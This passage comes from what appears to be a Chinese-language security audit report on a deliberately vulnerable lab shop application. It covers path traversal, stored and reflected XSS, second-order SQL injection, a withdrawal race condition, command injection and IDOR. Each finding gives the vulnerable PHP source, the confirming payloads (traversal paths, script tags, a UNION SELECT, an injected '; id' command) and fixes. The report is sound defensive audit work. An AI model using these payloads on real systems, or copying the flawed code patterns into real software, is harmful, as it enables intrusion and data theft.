- 修复方案（结论陈述）：不要在页面回显异常 message/trace；catch 中只记录服务端日志并返回通用提示（如“数据源不可用”）；同时将归档库名/凭据从源码默认值改为配置项，生产环境关闭错误详情。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/database.php:2-4`（sha256 `be196ddf57212663…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$output='';
    3  if(isset($_GET['probe'])){try{$schema=$_GET['probe']==='archive'?'shop_archive_unconfigured':(getenv('DB_NAME')?:'shop');$test=new PDO('mysql:host='.(getenv('DB_HOST')?:'db').';dbname='.$schema,getenv('DB_USER')?:'shop',getenv('DB_PASSWORD')?:'shop-local-password');$test->query('SELECT 1');$output='主数据源连接正常。';}catch(Throwable$e){$output=get_class($e).': '.$e->getMessage()."\n".$e->getTraceAsString();}}
    4  page('数据库诊断',function()use($output){echo '<section class="panel"><p>检查在线数据源与归档数据源。</p><form method="get"><label>数据源<select name="probe"><option value="main">主数据源</option><option value="archive">归档数据源</option></select></label><button>检查连接</button></form><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:4-7`（sha256 `2050819d093be02b…`）

```php
    4  function db(): PDO {
    5      static $pdo;
    6      if (!$pdo) $pdo = new PDO('mysql:host=' . (getenv('DB_HOST') ?: 'db') . ';dbname=' . (getenv('DB_NAME') ?: 'shop') . ';charset=utf8mb4', getenv('DB_USER') ?: 'shop', getenv('DB_PASSWORD') ?: 'shop-local-password', [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => false]);
    7      return $pdo;
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-04 support/download.php file 参数未规范化导致路径穿越任意文件读取

- 当前版本：finding `e158b6a09f1e4f84b85fd03e4eb93c48` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/support/download.php:3`；文件：`lab30-shop/app/public/support/download.php`
- 证据引用：`10c0c8123072e718` lab30-shop/app/public/support/download.php:2-3；`f5faf41dff9a5a91` lab30-shop/app/src/bootstrap.php:9-9；`458ca1b11ccc7039` lab30-shop/app/src/setup.php:31-36；`cf8341b8a8bbe3d7` lab30-shop/compose.yaml:40-44
- 根因类别：task_goal:v2:07b3729cb966c0c1aae7:1（规范类型 path_traversal）

**结论陈述（模型产出，不是证据）**

第3行 $_GET['file'] 未经 basename/realpath/白名单处理，直接拼接到 data_dir().'/docs/' 后用于 is_file 与 file_get_contents。攻击者提交 file=../vault/internal.txt 即可读取 setup.php 写入的 SHOP_INTERNAL_ 标记；file=../sessions/sess_<id> 可读取其他用户会话文件，且 file_get_contents 支持绝对路径，可进一步读取应用可访问文件。

- 攻击前身份与适用前提：攻击者需一个有效登录会话（任意 customer 账号即可）；/var/lib/shop 下存在 vault、sessions 等由 setup.php 创建的文件。
- 入口 → 传播 → 危险操作/状态变更：GET 参数 file，由任意已登录用户控制。 → $_GET['file'] -> data_dir().'/docs/'.(string)$_GET['file'] -> is_file 检查 -> file_get_contents 输出。 → file_get_contents($path) 读取并回显拼接路径下的任意文件。
- 防护与边界：仅有 require_user 登录校验与 is_file 存在性检查；无路径规范化、基目录约束或扩展名白名单。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `22f0efa8fd604a078f6ee41ed772b56e`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧（宿主审计执行作业 cb36005c0cdf43fbbc79eebe40ab07db，alice 登录会话）：同一登录会话请求 file=../vault/internal.txt，返回内容为 'SHOP_INTERNAL_382d1a3fce44de4763cb290a'（ATTACK 段原文），即 data_dir()/vault/internal.txt 中的内部标记。该标记由 setup.php:25-26、34 随机生成并只写入 vault/internal.txt（不在 docs 目录、不经页面回显），说明 ../ 穿越目录边界生效；同一脚本 file=shipping.txt 只返回文档内容。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：对 file 参数使用 basename() 并限定白名单扩展名，或用 realpath 规范化后校验前缀等于 data_dir().'/docs/'。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/support/download.php:2-3`（sha256 `71f0558eeb4ebb6c…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user();
    3  if(isset($_GET['file'])){$path=data_dir().'/docs/'.(string)$_GET['file'];if(!is_file($path))fail_request('文档不存在。',404);header('Content-Type: text/plain; charset=utf-8');echo file_get_contents($path);exit;}
```

`lab30-shop/app/src/bootstrap.php:9-9`（sha256 `2050819d093be02b…`）

```php
    9  function data_dir(): string { return getenv('SHOP_DATA_DIR') ?: '/var/lib/shop'; }
```

`lab30-shop/app/src/setup.php:31-36`（sha256 `53e7dc7286d7d370…`）

```php
   31      foreach (['sessions','vault','docs','messages','exports'] as $dir) { if (!is_dir("$root/$dir")) mkdir("$root/$dir",0770,true); }
   32      $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
   33      foreach($it as $file) if($file->isFile()) unlink($file->getPathname());
   34      file_put_contents("$root/vault/internal.txt",$marker . "\n");
   35      file_put_contents("$root/vault/account.php",'<?php echo "' . $marker . '";');
   36      file_put_contents("$root/docs/shipping.txt","配送说明：工作日 48 小时内发货。\n");
```

`lab30-shop/compose.yaml:40-44`（sha256 `4019766f612dc6a0…`）

```
   40        SHOP_DATA_DIR: /var/lib/shop
   41      ports:
   42        - '127.0.0.1:${SHOP_PORT:-18880}:80'
   43      volumes:
   44        - runtime:/var/lib/shop
```

### C-05 support/messages.php 留言正文未经 h() 输出导致存储型 XSS

- 当前版本：finding `20f1b555e4b648e8b9622864abb3123c` revision 1（项目版本 24）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/support/messages.php:5`；文件：`lab30-shop/app/public/support/messages.php`
- 证据引用：`2ba1a6f9578aa5c7` lab30-shop/app/public/support/messages.php:2-5；`5220b9ce518719f6` lab30-shop/app/src/bootstrap.php:10-10
- 根因类别：task_goal:v2:585e675c698bd7a595a7:1（规范类型 xss_s）

**结论陈述（模型产出，不是证据）**

任意已登录用户 POST message，服务端仅校验非空与 <=5000 字节即 INSERT 到 messages 表；第4行读回后第5行把 $row['message'] 直接拼进 '<div class="message-body">'.$row['message'].'</div>'，未使用 h()。攻击者提交 <img src=x onerror=...> 即在受害者浏览器执行，可劫持会话或代发起请求。

- 攻击前身份与适用前提：攻击者持有一个有效登录会话；受害者（含运营/管理员）打开 /support/messages.php 时触发。
- 入口 → 传播 → 危险操作/状态变更：HTTP POST 参数 message，任一已登录账号可控。 → POST message -> messages 表 INSERT(user_id,message) -> 第4行 SELECT m.* -> 第5行 foreach 输出到 HTML 文本上下文。 → echo '<div class="message-body">'.$row['message'].'</div>' 输出未编码的持久化内容。
- 防护与边界：仅有 check_csrf() 与长度校验；同页其他字段使用了 h()，message 路径未使用任何 HTML 编码或过滤。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `b6fb1aaba8d44d7b9665d6aec3331fef`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

存储/回读侧：alice 作业 e0e50f625cc94e22ae56287253c924de 用会话 csrf POST message='XSS <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">'，服务端返回 303 See Other（INSERT 后重定向；该作业因未捕获 303 退出码为 1，不作证据）；alice 作业 cb7d342e7a0341e3938391626cb56cca 读回页面，<div class="message-body"> 原始内容为 'XSS <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">'（FIRST_MESSAGE_BODY_RAW），IMG_TAG_RAW_PRESENT True、ESCAPED_LITERAL False，即未编码存储输出。受害者侧浏览器作业 7a26f4e9796c487d95c996a45f9ca23d（bob 会话）打开 /support/messages.php 后 dialogs=["PWNED-SXSS-7Q2Z"]，console_errors 出现 img 404，body_text 中该条留言（林晓 2026-11-10 08:03:54）只剩“XSS ”，<img> 已被浏览器解析执行。

- 评分依据：CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：输出改为 h($row['message'])；若需富文本则先做白名单净化再输出。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/support/messages.php:2-5`（sha256 `a6866f07b4de32f3…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();
    3  if($_SERVER['REQUEST_METHOD']==='POST') {check_csrf();$message=(string)($_POST['message']??'');if($message===''||strlen($message)>5000)fail_request('留言需为 1–5000 字节。');db()->prepare('INSERT INTO messages(user_id,message) VALUES(?,?)')->execute([$u['id'],$message]);event_log('leave_message');header('Location: /support/messages.php',true,303);exit;}
    4  $rows=db()->query('SELECT m.*,u.display_name FROM messages m JOIN users u ON u.id=m.user_id ORDER BY m.id DESC')->fetchAll();
    5  page('在线留言',function()use($rows){echo '<section class="panel"><h2>和我们聊聊</h2><form method="post">'.csrf_field().'<label>你的留言<textarea name="message" required></textarea></label><button>提交留言</button></form></section><div class="messages">';foreach($rows as$row)echo '<article class="panel"><strong>'.h($row['display_name']).'</strong><time>'.h($row['created_at']).'</time><div class="message-body">'.$row['message'].'</div></article>';echo '</div>';},'客服与帮助');
```

`lab30-shop/app/src/bootstrap.php:10-10`（sha256 `2050819d093be02b…`）

```php
   10  function h(mixed $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
```

### C-06 商品欢迎页 name 参数未编码输出导致反射型 XSS

- 当前版本：finding `a5707d3ea9bb4b9284ff9f164dbf955d` revision 1（项目版本 23）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/catalog/greeting.php:3`；文件：`lab30-shop/app/public/catalog/greeting.php`
- 证据引用：`c57a3bf6bb6b01db` lab30-shop/app/public/catalog/greeting.php:2-3；`5220b9ce518719f6` lab30-shop/app/src/bootstrap.php:10-10
- 根因类别：task_goal:v2:91888a39a29a133b47f6:1（规范类型 xss_r）

**结论陈述（模型产出，不是证据）**

catalog/greeting.php 第2行直接取 $_GET['name']，第3行在同一页回调中把 $name 原样 echo 进 <h2> 标签文本位置，未调用 bootstrap.php:10 定义的 h() 转义。攻击者可构造带脚本/事件处理器的 name 参数生成恶意链接，在受害者浏览器中执行脚本。

- 攻击前身份与适用前提：受害者访问含恶意 name 的 /catalog/greeting.php 链接；无需登录
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 name → $_GET['name'] -> $name -> page() 回调 echo '<h2>你好，'.$name.'</h2>' -> 浏览器解析 → 将用户输入直接 echo 进 HTML 输出
- 防护与边界：虽有 h() 存在（bootstrap.php:10），但此输出点未使用；无 CSP 等额外防护被读取到
- 静态判读：缺上下文（1 项）；缺失上下文：未读取所有入口文件，无法确认 check_csrf() 与 require_user() 的覆盖范围
- 动态验证：动态确认（verification `aa177705ed384b73be96fc5185fb4809`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧浏览器作业 f0bf49db8e6a496ba23469a6f77a636e（guest，会话隔离）：访问 /catalog/greeting.php?name=%3Cscript%3Ealert%28%27PWNED-XSS-7Q2Z%27%29%3C%2Fscript%3E，页面标题仍为“到店欢迎 · 拾光商城”，dialogs=["PWNED-XSS-7Q2Z"]，console_errors 为空；body_text 中该位置只余“你好，”而脚本内容未作为文本显示，说明 <script> 被浏览器解析执行并弹出对话框。screenshot 产物 sha256 63632ae9d950acc3abee5a1ececc28e7f4d1782bd13582a675e2edc84d13d6d2。

- 评分依据：CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：输出时使用 h($name)（bootstrap.php:10 的 htmlspecialchars ENT_QUOTES）或先 strip_tags 并限制长度；可追加 CSP 头。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/catalog/greeting.php:2-3`（sha256 `8e6db315fdfc32cf…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$name=(string)($_GET['name']??'拾光的朋友');
    3  page('到店欢迎',function()use($name){echo '<section class="panel"><h2>你好，'.$name.'</h2><p>愿今天也有值得期待的小事。</p><form method="get">';form_input('name','你的称呼');echo '<button>生成欢迎信息</button></form></section>';},'商品目录');
```

`lab30-shop/app/src/bootstrap.php:10-10`（sha256 `2050819d093be02b…`）

```php
   10  function h(mixed $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
```

### C-07 ops/report.php 将用户可控 nickname 直接拼入 SQL 导致二次注入

- 当前版本：finding `6bc2fbecc4be4bf0af206d7c9f717aac` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/report.php:3`；文件：`lab30-shop/app/public/ops/report.php`
- 证据引用：`667c91ac7c21aa66` lab30-shop/app/public/ops/report.php:2-3；`ec18381d7af73d0f` lab30-shop/app/public/account/update.php:4-6；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36；`5220b9ce518719f6` lab30-shop/app/src/bootstrap.php:10-10
- 根因类别：task_goal:v2:31a540b173d649b580fc:1（规范类型 sqli）

**结论陈述（模型产出，不是证据）**

report.php:3 执行 db()->query("SELECT username,email,role FROM users WHERE nickname='".$nickname."'")，nickname 来自数据库但可由任意登录用户在 account/update.php 第5-6行写入（nickname 在列白名单，值仅 (string) 强转后参数化存储，无内容过滤）。攻击者注册/登录普通账户后把 nickname 设为含单引号的 SQL payload，operator 或 admin 打开报表页（带对应 user_id）时，payload 被拼入查询执行，可读出任意表数据（如 settings.internal_marker）或基于布尔/报错推进。防护缺失在于拼接而非占位符，且 h() 仅用于 HTML 输出不对 SQL 生效。

- 攻击前身份与适用前提：攻击者拥有任意登录账户并可提交带有效 CSRF 令牌的资料更新请求；存在 operator 或 admin 会访问 /ops/report.php?user_id=<攻击者id> 并携带相应会话
- 入口 → 传播 → 危险操作/状态变更：任意已登录用户通过 POST /account/update.php 提交 nickname 字段写入 users.nickname；owner 报表读取该值后拼入查询 → update.php:5 nickname 进入 $values → update.php:6 参数化写入 users.nickname → report.php:2 参数化读出 $nickname → report.php:3 字符串拼接后 query() 执行 → db()->query 执行拼接了 nickname 的 SELECT 语句
- 防护与边界：report.php:2 的初次读取使用占位符，但 report.php:3 二次查询改为字符串拼接；account/update.php:5-6 只做类型强转与参数化存储，对内容无白名单/转义；bootstrap.php:10 的 h() 只用于 HTML 转义
- 静态判读：证据已记录
- 动态验证：动态确认（verification `cb6ce27b445b4dfc8f3cea92565305ec`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

注入侧（alice，作业 84b9c39a2b124066a2dbb248d737bc0c）：GET /account/update.php 取得 48 位 csrf 后仅提交 nickname，值为 ' UNION SELECT 'PWNED-SQLI2-7Q2Z', value, 'red' FROM settings WHERE `key`='internal_marker'-- -，响应 200 且“资料已保存。”，读回 input 值为 &#039; UNION SELECT …（READBACK_HAS_PAYLOAD True）。触发侧（operator，作业 4bb672ce19a546aea3a220522daa53ab）：带 Accept: application/json 请求 /ops/report.php?user_id=1，返回 200：{"saved_nickname":"' UNION SELECT 'PWNED-SQLI2-7Q2Z', value, 'red' FROM settings WHERE `key`='internal_marker'-- -","members":[{"username":"PWNED-SQLI2-7Q2Z","email":"SHOP_INTERNAL_84b0c603ccec1a022beb113d","role":"red"}]}，MARKER_ROW 与 SECRET_LEAKED 均为 True；同一请求对 user_id=2（bob，nickname=bob）仍返回 {"saved_nickname":"bob","members":[{"username":"bob","email":"bob@shop.local","role":"customer"}]}，说明差异来自存储的 nickname 内容而非接口本身。

- 评分依据：CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：report.php:3 改为参数化查询：$q=db()->prepare('SELECT username,email,role FROM users WHERE nickname=?');$q->execute([$nickname]);；同时对 write 侧 nickname 做长度/字符校验，并对读回值按数据库字符集正确绑定。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/report.php:2-3`（sha256 `90d7d60d44815374…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user(['operator','admin']);$id=(int)($_GET['user_id']??1);$q=db()->prepare('SELECT nickname FROM users WHERE id=?');$q->execute([$id]);$nickname=$q->fetchColumn();if($nickname===false)fail_request('会员不存在。',404);
    3  $rows=db()->query("SELECT username,email,role FROM users WHERE nickname='".$nickname."'")->fetchAll();
```

`lab30-shop/app/public/account/update.php:4-6`（sha256 `b8227f19c05d0cd3…`）

```php
    4      check_csrf();$columns=['display_name','email','role','balance','tier','nickname','homepage'];$set=[];$values=[];
    5      foreach($_POST as$key=>$value)if(in_array($key,$columns,true)){$set[]='`'.$key.'`=?';$values[]=(string)$value;}
    6      if(!$set)fail_request('没有可更新的资料。');$values[]=$u['id'];db()->prepare('UPDATE users SET '.implode(',',$set).' WHERE id=?')->execute($values);event_log('update_profile',['fields'=>array_keys($_POST)]);$notice='资料已保存。';$u=user();
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

`lab30-shop/app/src/bootstrap.php:10-10`（sha256 `2050819d093be02b…`）

```php
   10  function h(mixed $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
```

### C-08 钱包提现余额检查与扣减非原子，存在并发竞态透支

- 当前版本：finding `61e9d885a7434e17a86e04f517471730` revision 1（项目版本 32）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/wallet/withdraw.php:7`；文件：`lab30-shop/app/public/wallet/withdraw.php`
- 证据引用：`d0a2bdabe3fc2799` lab30-shop/app/public/wallet/withdraw.php:2-2；`a044780447d4b470` lab30-shop/app/public/wallet/withdraw.php:4-5；`b18e822d79b81e94` lab30-shop/app/public/wallet/withdraw.php:6-6；`5236e46f3074f56b` lab30-shop/app/public/wallet/withdraw.php:7-8
- 根因类别：task_goal:v2:d613895f7a074dbc0955:1（规范类型 race_condition）

**结论陈述（模型产出，不是证据）**

withdraw.php 先 SELECT 余额、比较、sleep 350ms，最后用旧 balance-$amount 无条件 UPDATE 覆写余额，全程无事务、无行锁、无 WHERE balance>=?。同一用户多个并发请求可在写入前都读到同一余额并通过检查，各自按旧余额扣减，从而提取超过实际余额的资金；余额被相同值覆盖而多条 withdrawals 记录写入，形成套利。

- 攻击前身份与适用前提：攻击者持有已登录账户且余额大于单笔提现金额；能并发发送多个携带同一 CSRF token 的 POST 请求；数据库默认非串行化隔离
- 入口 → 传播 → 危险操作/状态变更：已登录用户并发提交 POST /wallet/withdraw.php（带合法 CSRF），amount 为正且不超过余额 → 第2行解析 amount；第4行 SELECT balance；第5行比较通过；第6行 usleep 350ms 保留窗口；第7行以旧余额计算并 UPDATE 覆写；第8行插入提现记录 → 非条件 UPDATE users SET balance=? 覆写余额并插入 withdrawals 记录
- 防护与边界：第2行仅校验金额范围不防并发；第5行检查基于独立读取非原子；第7行无余额条件、无 FOR UPDATE、无事务（第3行提前 session_write_close）
- 静态判读：证据已记录
- 动态验证：动态确认（verification `70f5d025a4dd43e9b5f0da9adff292ed`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

alice 在同一会话下，以当前余额 99.00 为 amount，用同一 csrf 由两线程经 Barrier 同时 POST /wallet/withdraw.php：两个请求均返回 200，分别 {"status":"paid","amount":99,"balance":0,"receipt_id":3} 与 {"status":"paid","amount":99,"balance":0,"receipt_id":2}，耗时约 0.36s。随后读回 {"balance":"0.00","withdrawn_total":199}，withdrawals 含两条 99.00 记录（id 3、2）与正常对照的 1.00 记录（id 1），即从初始 100.00 余额累计提取 199.00（job 0328dd0930d94d76ba931bd8918ba83d，exit 0）。

- 评分依据：CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：单事务内 SELECT ... FOR UPDATE 锁行，或执行 UPDATE users SET balance=balance-? WHERE id=? AND balance>=? 并校验 affected rows=1 后再插入 withdrawals；失败回滚；删除 usleep。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/wallet/withdraw.php:2-2`（sha256 `e3e73271e379b085…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();require_post();check_csrf();$amount=filter_var($_POST['amount']??null,FILTER_VALIDATE_FLOAT);if($amount===false||$amount<=0||$amount>10000)fail_request('提现金额不正确。');
```

`lab30-shop/app/public/wallet/withdraw.php:4-5`（sha256 `e3e73271e379b085…`）

```php
    4  $q=db()->prepare('SELECT balance FROM users WHERE id=?');$q->execute([$id]);$balance=(float)$q->fetchColumn();
    5  if($balance<$amount)fail_request('账户余额不足，请调整提现金额。',409);
```

`lab30-shop/app/public/wallet/withdraw.php:6-6`（sha256 `e3e73271e379b085…`）

```php
    6  usleep(350000);
```

`lab30-shop/app/public/wallet/withdraw.php:7-8`（sha256 `e3e73271e379b085…`）

```php
    7  $q=db()->prepare('UPDATE users SET balance=? WHERE id=?');$q->execute([$balance-$amount,$id]);
    8  $q=db()->prepare('INSERT INTO withdrawals(user_id,amount) VALUES(?,?)');$q->execute([$id,$amount]);
```

### C-09 ops/batch-check.php 将 GET 参数 host 未转义拼入 shell_exec，operator 账号可执行任意系统命令

- 当前版本：finding `264e0609408a450888c4851f4d477be1` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/src/host_check.php:2`；文件：`lab30-shop/app/public/ops/batch-check.php`
- 证据引用：`a41ee4811beeaf1b` lab30-shop/app/public/ops/batch-check.php:1-3；`65fc5323ae7c9b98` lab30-shop/app/src/host_check.php:1-2；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:9a716e68efc12048fb89:1（规范类型 command_injection）

**结论陈述（模型产出，不是证据）**

batch-check.php 第2行从 $_GET['host'] 取任意字符串并直接传入 host_check()；src/host_check.php 第2行把该字符串原样拼接进 shell_exec('ping -c 1 -W 1 '.$host)。全链路无 escapeshellarg、无字符过滤、无主机名白名单，攻击者在参数中加入 ; 或 $( ) 等分隔符即可在应用服务器上执行任意命令，并把命令输出回显到页面 <pre> 中。入口只校验会话角色为 operator 或 admin，不构成对命令注入的防护。

- 攻击前身份与适用前提：需要有效的 operator 或 admin 会话（可由注册/登录获得或凭据泄露）；无需 CSRF token，因为该入口走 GET 且无 check_csrf()
- 入口 → 传播 → 危险操作/状态变更：GET 参数 host（ops/batch-check.php 第2行） → batch-check.php:2 读取 $_GET['host'] → 强转字符串后作为参数传给 host_check($host) → host_check.php:2 以字符串拼接方式构造 shell 命令 → shell_exec 执行 → 返回值经 h() 输出到页面 → shell_exec('ping -c 1 -W 1 ' . $host) 执行拼接后的系统命令
- 防护与边界：仅有 require_user(['operator','admin']) 的角色校验；无 escapeshellarg、无输入过滤、无白名单，输出端 h() 只做 HTML 转义不阻止命令执行
- 静态判读：证据已记录
- 动态验证：动态确认（verification `ccc52153a88e4dd5b4ef601b6d70ef19`）
- 正式终审：独立批次 04d1b79269574856b284cbde71c9678a；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

GET /ops/batch-check.php?host=127.0.0.1%3B%20echo%20POC_MARK_9f3a2b%3B%20id（同一 operator 会话）返回 200，<pre> 在 ping 统计后额外输出 "POC_MARK_9f3a2b" 与 "uid=33(www-data) gid=33(www-data) groups=33(www-data)"，即注入的 echo/id 命令被执行并回显；MARKER_IN_NORMAL_PRE=False，MARKER_IN_ATTACK_PRE=True。

- 评分依据：CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：不要通过 shell 构造 ping 命令。改用 escapeshellarg($host) 并对 host 做严格校验（filter_var FILTER_VALIDATE_IP 或白名单正则 /^[A-Za-z0-9.-]{1,253}$/），更佳方案是使用 PHP 原生 socket/fsockopen 做连通性探测；同时该操作应改为 POST 并加 check_csrf()。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/batch-check.php:1-3`（sha256 `5f76332e7ad1b33a…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require __DIR__.'/../../src/host_check.php';require_user(['operator','admin']);$host=(string)($_GET['host']??'');$output=$host!==''?host_check($host):'';
    3  page('主机巡检',function()use($host,$output){echo '<section class="panel"><form method="get">';form_input('host','巡检主机',$host?:'127.0.0.1');echo '<button>委托巡检</button></form><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/host_check.php:1-2`（sha256 `c3a868155c2d335e…`）

```php
    1  <?php
    2  function host_check(string $host): string { return (string)shell_exec('ping -c 1 -W 1 ' . $host); }
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-10 订单详情仅按请求 id 查询，任意登录用户可读取他人订单

- 当前版本：finding `13a0f5bed6414ab0948f6f25117d47f5` revision 1（项目版本 37）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/orders/detail.php:2`；文件：`lab30-shop/app/public/orders/detail.php`
- 证据引用：`508acdd24002c0f9` lab30-shop/app/public/orders/detail.php:2-2；`11f6d28e3dbb78f6` lab30-shop/app/public/orders/detail.php:3-3；`8b236e783043021b` lab30-shop/app/public/orders/detail.php:4-4；`490c7d72eb514d6b` lab30-shop/app/public/orders/index.php:2-2；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:70ce02c8e36e0a593be7:1（规范类型 idor）

**结论陈述（模型产出，不是证据）**

orders/detail.php 调用 require_user() 仅确认已登录，随后用 SELECT o.*,u.username,p.name FROM orders ... WHERE o.id=? 仅以客户端 $_GET['id'] 过滤，未附加 user_id=当前用户 条件；查得订单后第 3 行在 Accept: application/json 时直接 json_response($o) 返回全部字段，第 4 行渲染出 order_no、购买人、数量、实付金额与 private_note。任意登录用户遍历 id 即可读取他人订单隐私与金额数据。

- 攻击前身份与适用前提：需要一个已登录用户账号；目标订单 id 存在；无需该订单属于攻击者
- 入口 → 传播 → 危险操作/状态变更：GET 参数 id → 未记录 → 按客户端 id 读取订单并回显他人订单数据
- 防护与边界：仅有 require_user() 登录校验；无对象归属过滤，无角色/租户限制
- 静态判读：证据已记录
- 动态验证：动态确认（verification `79c207c526484af5aeaa8402b54554c7`）
- 正式终审：独立批次 d6beccbf03d149d3b864d51c226c5cf3；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

保持 alice 会话，只把详情 id 改为2，200 返回 user_id=2、username=bob、BOB_PRIVATE_ORDER_gift_for_family；不存在的 id=3..20 返回404。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：查询改为 WHERE o.id=? AND o.user_id=?，绑定 $_SESSION 用户 id；如需区分角色，另加显式运营授权判断。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/orders/detail.php:2-2`（sha256 `be69aa78cecffcfd…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user();$q=db()->prepare('SELECT o.*,u.username,p.name FROM orders o JOIN users u ON u.id=o.user_id LEFT JOIN products p ON p.id=o.product_id WHERE o.id=?');$q->execute([$_GET['id']??0]);$o=$q->fetch();if(!$o)fail_request('订单不存在。',404);
```

`lab30-shop/app/public/orders/detail.php:3-3`（sha256 `be69aa78cecffcfd…`）

```php
    3  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response($o);
```

`lab30-shop/app/public/orders/detail.php:4-4`（sha256 `be69aa78cecffcfd…`）

```php
